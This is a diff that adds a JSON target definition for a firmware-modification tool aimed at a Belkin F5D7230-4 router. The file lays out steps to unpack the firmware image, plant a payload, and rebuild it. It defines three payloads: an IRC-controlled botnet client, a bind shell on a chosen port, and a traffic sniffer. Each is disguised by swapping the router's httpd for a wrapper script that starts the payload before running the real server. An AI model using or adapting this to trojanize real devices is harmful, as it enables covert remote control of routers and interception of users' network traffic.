@@ -1,0 +1,105 @@
+{
+  "Meta":{
+    "Targets":[
+      {
+        "Vendor":"Belkin",
+        "Model":"F5D7230-4 v1xxx",
+        "Version":"4.03.03",
+        "Status":"Verified"
+      }
+    ],
+    "Authors":[
+      "Michael Coppola"
+    ],
+    "Date":"July 17, 2012",
+    "Size":1871422,
+    "NeedsRoot":false,
+    "Filename":"f5d7230-4_4.03.03.bin",
+    "Download":"http://cache-www.belkin.com/support/dl/f5d7230-4_4.03.03.bin",
+    "Checksum":"e01594630919e7650279ef8234c448a2"
+  },
+  "OrderOfOperations":[
+    "ExtractParts",
+    "UnpackFS",
+    "_PAYLOAD_",
+    "BuildFS",
+    "GenerateEFH"
+  ],
+  "ExtractParts":{
+    "Description":"Extracting parts from firmware image",
+    "Steps":[
+      ["belky-extract", "_FIRMWARE_IMG_", "/kernel.bin", "/filesystem.bin", "/nvramsettings.txt"]
+    ]
+  },
+  "UnpackFS":{
+    "Description":"Unpacking filesystem",
+    "Steps":[
+      ["cramfsck-2.x", "/filesystem.bin", "/extracted_fs"]
+    ]
+  },
+  "BuildFS":{
+    "Description":"Building filesystem",
+    "Steps":[
+      ["mkcramfs-2.x", "/extracted_fs", 0, "/newfs.bin"]
+    ]
+  },
+  "GenerateEFH":{
+    "Description":"Reconstructing EFH image",
+    "Steps":[
+      ["belky-create", "/kernel.bin", "/newfs.bin", "/nvramsettings.txt", "_TARGET_IMG_"]
+    ]
+  },
+  "Payloads":{
+    "botnet":{
+      "Description":"Remotely control device via IRC",
+      "Steps":[
+        ["cp", "payloads/botnet", "/extracted_fs/usr/sbin/botnet"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["rm", "/extracted_fs/usr/sbin/pptp"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/botnet _IP_ _PORT_ \\_CHANNEL_ _PREFIX_ &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_IP_":"IP address of IRC server",
+        "_PORT_":"Port of IRC server",
+        "_CHANNEL_":"Channel to join (include #)",
+        "_PREFIX_":"Prefix of bot nick"
+      }
+    },
+    "bind":{
+      "Description":"Bind shell on TCP port",
+      "Steps":[
+        ["cp", "payloads/bind", "/extracted_fs/usr/sbin/bind"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/bind _PORT_ /bin/msh &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_PORT_":"Port to listen on"
+      }
+    },
+    "sniff":{
+      "Description":"Sniff traffic on the network",
+      "Steps":[
+        ["cp", "payloads/sniff", "/extracted_fs/usr/sbin/sniff"],
+        ["mv", "/extracted_fs/usr/sbin/httpd", "/extracted_fs/usr/sbin/httpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "#!/bin/msh\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/sniff _TARGET_ _LISTEN_ &\n", "/extracted_fs/usr/sbin/httpd"],
+        ["appendtext", "/usr/sbin/httpd.bak\n", "/extracted_fs/usr/sbin/httpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/httpd"]
+      ],
+      "Variables":{
+        "_TARGET_":"Sniff TCP traffic on port",
+        "_LISTEN_":"Port to listen on"
+      }
+    }
+
+  }
+}
